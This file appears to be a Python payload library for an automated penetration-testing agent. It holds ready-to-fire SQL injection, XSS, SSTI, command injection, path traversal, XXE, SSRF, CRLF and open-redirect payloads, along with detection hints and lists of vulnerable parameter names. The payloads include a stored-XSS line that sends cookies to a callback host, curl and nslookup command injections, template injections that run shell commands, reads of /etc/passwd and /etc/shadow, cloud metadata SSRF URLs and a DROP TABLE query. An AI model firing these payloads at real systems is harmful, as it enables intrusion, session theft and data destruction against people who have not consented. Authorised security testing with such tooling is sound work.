"""
Injection Payload Library

Context-aware payload generation for SQL injection, XSS, SSTI, command injection,
path traversal, and other OWASP Top 10 vulnerability classes.  The agent calls
`generate_payloads(vuln_type, context)` and receives a list of payloads ready
to feed into execute_browser, execute_curl, or execute_ffuf.
"""

from typing import Dict, List, Optional

# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------
SQLI_ERROR_BASED: List[str] = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT username,password FROM users--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "1; SELECT pg_sleep(0)--",
]

SQLI_TIME_BASED: List[str] = [
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR BENCHMARK(5000000,SHA1('test'))--",
    "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
    "1) AND SLEEP(5)--",
    "1)) AND SLEEP(5)--",
]

SQLI_BOOLEAN_BASED: List[str] = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR 1=1#",
    "' OR 1=2#",
]

SQLI_AUTH_BYPASS: List[str] = [
    "admin' --",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "admin' OR '1'='1",
    "\" OR \"\"=\"",
    "' OR ''='",
]

SQLI_STACKED: List[str] = [
    "'; DROP TABLE test--",
    "'; SELECT 1--",
    "1; SELECT * FROM information_schema.tables--",
]

# ---------------------------------------------------------------------------
# Cross-Site Scripting (XSS)
# ---------------------------------------------------------------------------
XSS_REFLECTED: List[str] = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "javascript:alert(1)",
]

XSS_ENCODED: List[str] = [
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<scRiPt>alert(1)</sCrIpT>",
    "<img src=x onerror=alert`1`>",
    "<svg/onload=alert(1)>",
    "'-alert(1)-'",
    "\";alert(1);//",
]

XSS_DOM: List[str] = [
    "#<script>alert(1)</script>",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
    "'-alert(1)-'",
]

XSS_STORED_PROBES: List[str] = [
    "<script>fetch('https://COLLABORATOR/xss?c='+document.cookie)</script>",
    "<img src=x onerror=fetch('https://COLLABORATOR/xss')>",
    "\"><svg onload=fetch('https://COLLABORATOR/xss')>",
]

# ---------------------------------------------------------------------------
# Server-Side Template Injection (SSTI)
# ---------------------------------------------------------------------------
SSTI_PAYLOADS: List[str] = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{'a'*5}}",
    "{{[].__class__}}",
    "a]}}{{7*7}}",
]

# ---------------------------------------------------------------------------
# Command Injection
# ---------------------------------------------------------------------------
CMDI_PAYLOADS: List[str] = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "\n id",
    "'; id; '",
    "\"; id; \"",
    "%0a id",
    "; nslookup COLLABORATOR",
    "| curl -s https://COLLABORATOR/cmdi",
]

# ---------------------------------------------------------------------------
# Path Traversal / LFI
# ---------------------------------------------------------------------------
PATH_TRAVERSAL_PAYLOADS: List[str] = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "/etc/passwd",
    "....//....//....//etc/shadow",
    "..%00/etc/passwd",
    "file:///etc/passwd",
    "/proc/self/environ",
    "../../../etc/hosts",
]

# ---------------------------------------------------------------------------
# XML External Entity (XXE)
# ---------------------------------------------------------------------------
XXE_PAYLOADS: List[str] = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR/xxe">%xxe;]>',
]

# ---------------------------------------------------------------------------
# Server-Side Request Forgery (SSRF)
# ---------------------------------------------------------------------------
SSRF_PAYLOADS: List[str] = [
    "http://COLLABORATOR/",
    "https://COLLABORATOR/ssrf",
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://0x7f000001",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "dict://localhost:11211/stats",
    "gopher://localhost:6379/_INFO",
]

# ---------------------------------------------------------------------------
# CRLF / Header Injection
# ---------------------------------------------------------------------------
CRLF_PAYLOADS: List[str] = [
    "%0d%0aSet-Cookie:crlf=injection",
    "%0d%0aX-Injected:header",
    "\\r\\nX-Injected: header",
    "%0d%0a%0d%0a<script>alert(1)</script>",
]

# ---------------------------------------------------------------------------
# Open Redirect
# ---------------------------------------------------------------------------
OPEN_REDIRECT_PAYLOADS: List[str] = [
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "//evil%00.com",
    "https:evil.com",
    "////evil.com",
    "javascript:alert(1)",
]

# ---------------------------------------------------------------------------
# Registry / lookup
# ---------------------------------------------------------------------------

PAYLOAD_REGISTRY: Dict[str, Dict[str, List[str]]] = {
    "sqli": {
        "error_based": SQLI_ERROR_BASED,
        "time_based": SQLI_TIME_BASED,
        "boolean_based": SQLI_BOOLEAN_BASED,
        "auth_bypass": SQLI_AUTH_BYPASS,
        "stacked": SQLI_STACKED,
    },
    "xss": {
        "reflected": XSS_REFLECTED,
        "encoded": XSS_ENCODED,
        "dom": XSS_DOM,
        "stored_probes": XSS_STORED_PROBES,
    },
    "ssti": {"default": SSTI_PAYLOADS},
    "cmdi": {"default": CMDI_PAYLOADS},
    "path_traversal": {"default": PATH_TRAVERSAL_PAYLOADS},
    "xxe": {"default": XXE_PAYLOADS},
    "ssrf": {"default": SSRF_PAYLOADS},
    "crlf": {"default": CRLF_PAYLOADS},
    "open_redirect": {"default": OPEN_REDIRECT_PAYLOADS},
}


def generate_payloads(
    vuln_type: str,
    technique: Optional[str] = None,
    max_payloads: int = 20,
    collaborator_url: Optional[str] = None,
) -> Dict:
    """Return payloads for a given vulnerability type.

    Args:
        vuln_type: One of sqli, xss, ssti, cmdi, path_traversal, xxe, ssrf,
                   crlf, open_redirect.
        technique: Sub-technique (e.g. "time_based" for sqli, "encoded" for xss).
                   If omitted, returns payloads from all sub-techniques.
        max_payloads: Cap on number of payloads returned.
        collaborator_url: If provided, replaces COLLABORATOR placeholder in
                          out-of-band payloads. If omitted and payloads still
                          contain COLLABORATOR, a live Interactsh session is
                          provisioned and payload_domain is substituted.

    Returns:
        Dict with "vuln_type", "technique", "payloads" list, and "detection_hints".
    """
    vuln_type = vuln_type.strip().lower()
    if vuln_type not in PAYLOAD_REGISTRY:
        return {
            "error": f"Unknown vuln_type '{vuln_type}'. "
                     f"Available: {', '.join(sorted(PAYLOAD_REGISTRY.keys()))}",
        }

    sub = PAYLOAD_REGISTRY[vuln_type]
    if technique:
        technique = technique.strip().lower()
        if technique not in sub:
            return {
                "error": f"Unknown technique '{technique}' for {vuln_type}. "
                         f"Available: {', '.join(sorted(sub.keys()))}",
            }
        payloads = list(sub[technique])
    else:
        payloads = []
        for v in sub.values():
            payloads.extend(v)

    payloads = payloads[:max_payloads]

    oob_meta = None
    needs_oob = any("COLLABORATOR" in p for p in payloads)
    if needs_oob and not collaborator_url:
        try:
            from app.services.interactsh_service import ensure_session

            oob_meta = ensure_session()
            if oob_meta.get("success") and oob_meta.get("payload_domain"):
                collaborator_url = str(oob_meta["payload_domain"])
        except Exception:  # noqa: BLE001
            oob_meta = None

    if collaborator_url:
        payloads = [p.replace("COLLABORATOR", collaborator_url) for p in payloads]

    detection_hints = _get_detection_hints(vuln_type)

    out = {
        "vuln_type": vuln_type,
        "technique": technique or "all",
        "payload_count": len(payloads),
        "payloads": payloads,
        "detection_hints": detection_hints,
    }
    if collaborator_url:
        out["collaborator_url"] = collaborator_url
    if oob_meta and oob_meta.get("success"):
        out["interactsh"] = {
            "session_id": oob_meta.get("session_id"),
            "payload_url": oob_meta.get("payload_url"),
            "payload_email": oob_meta.get("payload_email"),
            "next": f"execute_interactsh poll {oob_meta.get('session_id')}",
        }
    return out


def _get_detection_hints(vuln_type: str) -> Dict:
    """Return patterns the agent should look for in responses to confirm a vulnerability."""
    hints: Dict[str, Dict] = {
        "sqli": {
            "error_signatures": [
                "SQL syntax", "mysql_fetch", "ORA-", "PG::SyntaxError",
                "Unclosed quotation mark", "SQLSTATE", "SQLite3::",
                "Microsoft OLE DB Provider", "ODBC SQL Server Driver",
                "pg_query()", "syntax error at or near",
            ],
            "time_based": "Compare response times: vulnerable param adds 5+ seconds delay",
            "boolean_based": "Compare response length/content between 1=1 (true) and 1=2 (false) payloads",
            "union_based": "Look for extra data rows appearing in the response from UNION SELECT",
        },
        "xss": {
            "reflected": "Check if payload appears unescaped in response HTML",
            "dom": "Check if alert dialog is triggered (execute_browser check_xss action)",
            "indicators": [
                "Payload reflected verbatim in page source",
                "JavaScript alert/prompt/confirm dialog triggered",
                "Event handler (onerror, onload) executed",
            ],
        },
        "ssti": {
            "indicators": [
                "{{7*7}} renders as 49 in response",
                "${7*7} renders as 49",
                "Config/class objects leaked in response",
            ],
        },
        "cmdi": {
            "indicators": [
                "uid=", "root:", "/bin/bash",
                "Command output appears in response body",
            ],
            "time_based": "Use `; sleep 5` and compare response time",
        },
        "path_traversal": {
            "indicators": [
                "root:x:0:0:", "/bin/bash", "[extensions]",
                "File contents from outside web root in response",
            ],
        },
        "xxe": {
            "indicators": [
                "root:x:0:0:", "File contents in XML response",
                "DNS/HTTP callback to collaborator",
            ],
        },
        "ssrf": {
            "indicators": [
                "Internal service response in output",
                "ami-id, instance-id (AWS metadata)",
                "DNS/HTTP callback to collaborator",
            ],
        },
        "crlf": {
            "indicators": [
                "Injected header appears in response headers",
                "Set-Cookie header injected",
            ],
        },
        "open_redirect": {
            "indicators": [
                "3xx redirect to attacker-controlled domain",
                "Location header points to external URL",
            ],
        },
    }
    return hints.get(vuln_type, {})


# ---------------------------------------------------------------------------
# Common vulnerable parameter names (for parameter discovery/prioritization)
# ---------------------------------------------------------------------------

INTERESTING_PARAM_NAMES: Dict[str, List[str]] = {
    "sqli_prone": [
        "id", "uid", "user_id", "item_id", "product_id", "order_id",
        "cat", "category", "page", "sort", "order", "dir",
        "search", "q", "query", "keyword", "filter", "where",
        "table", "column", "field", "select", "from",
        "report", "export", "download", "file",
    ],
    "xss_prone": [
        "q", "search", "query", "keyword", "term", "s",
        "name", "username", "email", "comment", "message", "body",
        "title", "subject", "description", "content",
        "url", "redirect", "return", "next", "goto", "callback",
        "error", "msg", "alert", "status",
    ],
    "ssrf_prone": [
        "url", "uri", "path", "dest", "redirect", "site",
        "feed", "rss", "val", "validate", "domain", "host",
        "page", "callback", "return", "next", "data",
        "load", "fetch", "proxy", "img", "image", "src",
    ],
    "path_traversal_prone": [
        "file", "filename", "path", "filepath", "document",
        "page", "template", "include", "dir", "folder",
        "download", "read", "load", "view", "content",
        "lang", "language", "locale",
    ],
    "cmdi_prone": [
        "cmd", "exec", "command", "execute", "run",
        "ping", "host", "ip", "target", "address",
        "domain", "dir", "path", "log", "daemon",
    ],
    "redirect_prone": [
        "url", "redirect", "redirect_url", "return", "return_url",
        "next", "goto", "dest", "destination", "redir",
        "callback", "continue", "returnTo", "forward",
    ],
}
